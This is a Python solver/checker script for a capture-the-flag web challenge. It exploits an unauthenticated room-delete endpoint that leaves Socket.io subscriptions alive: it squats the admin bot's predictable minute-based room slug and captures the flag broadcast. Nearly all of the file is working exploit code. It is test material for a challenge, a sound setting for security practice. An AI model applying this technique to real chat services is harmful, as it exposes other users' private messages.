#!/usr/bin/env python3

import asyncio
import json
import os
import random
import string
import sys
import time
import urllib.error
import urllib.request

import socketio

# Adapted from the challenge's own checker/exploit.py (author-provided,
# unchanged other than reading the target URL from env vars and verifying
# the recovered flag against flag_flag instead of a bare CLI arg/exit code).
#
# Room metadata lives in SQLite and is deleted via `DELETE /api/rooms/:slug`,
# but that never disconnects sockets already joined to that slug's Socket.io
# room. The admin bot (src/services/adminBot.js) recreates a predictable
# slug every 60s (`my-secret-room-<current-minute>`) with a fresh random
# password and broadcasts the flag into it. By creating + joining that same
# slug *before* the bot does, then deleting it over REST while staying
# connected over the socket, our stale socket keeps receiving broadcasts for
# that slug even after the bot "recreates" it with its own new password.


def rand_str(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def http_post(url, data):
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def http_delete(url):
    req = urllib.request.Request(url, method="DELETE")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code


async def squatt(base_url, slug, password, got_flag):
    """Create a room, join it, delete it, and wait for the flag broadcast."""
    status, _ = http_post(
        f"{base_url}/api/rooms",
        {"room_slug": slug, "password": password},
    )
    if status == 409:
        # Stale room from a previous run — DELETE is unauthenticated, so clean it up.
        http_delete(f"{base_url}/api/rooms/{slug}")
        status, _ = http_post(
            f"{base_url}/api/rooms",
            {"room_slug": slug, "password": password},
        )
    if status != 201:
        print(f"[{slug}] room creation failed (HTTP {status})", file=sys.stderr)
        return

    sio = socketio.AsyncClient(logger=False, engineio_logger=False)

    @sio.on("room:message")
    async def on_message(data):
        msg = data.get("message", "")
        if "I sure hope" in msg and not got_flag.is_set():
            got_flag.msg = msg
            got_flag.set()

    try:
        await sio.connect(base_url, transports=["websocket"])

        ack = await sio.call(
            "room:join",
            {"room_slug": slug, "password": password, "username": "checker"},
            timeout=10,
        )
        if not ack or not ack.get("ok"):
            print(f"[{slug}] join failed: {ack}", file=sys.stderr)
            return

        http_delete(f"{base_url}/api/rooms/{slug}")
        print(f"[{slug}] squatted — waiting for bot...", file=sys.stderr)

        # Wait until either this socket or the sibling receives the flag.
        await asyncio.wait_for(got_flag.wait(), timeout=90)

    except asyncio.TimeoutError:
        pass
    except Exception as e:
        print(f"[{slug}] error: {e}", file=sys.stderr)
    finally:
        try:
            await sio.disconnect()
        except Exception:
            pass


async def exploit(base_url):
    now_min = int(time.time()) // 60
    slugs = [f"my-secret-room-{now_min}", f"my-secret-room-{now_min + 1}"]
    password = rand_str()

    got_flag = asyncio.Event()
    got_flag.msg = None

    print(f"Squatting slugs: {slugs}", file=sys.stderr)
    await asyncio.gather(*[squatt(base_url, s, password, got_flag) for s in slugs])

    if got_flag.is_set() and got_flag.msg:
        print(got_flag.msg)
        return True
    else:
        print("FAIL: timed out without receiving the flag", file=sys.stderr)

    return False


def check(url):
    if not asyncio.run(exploit(url)):
        raise SystemExit("exploit failed: timed out without receiving the flag")


if __name__ == "__main__":
    host = os.environ.get("SERVICE_APP_HTTP_HOST", "127.0.0.1")
    port = os.environ.get("SERVICE_APP_HTTP_PORT", "3000")
    check(f"http://{host}:{port}")

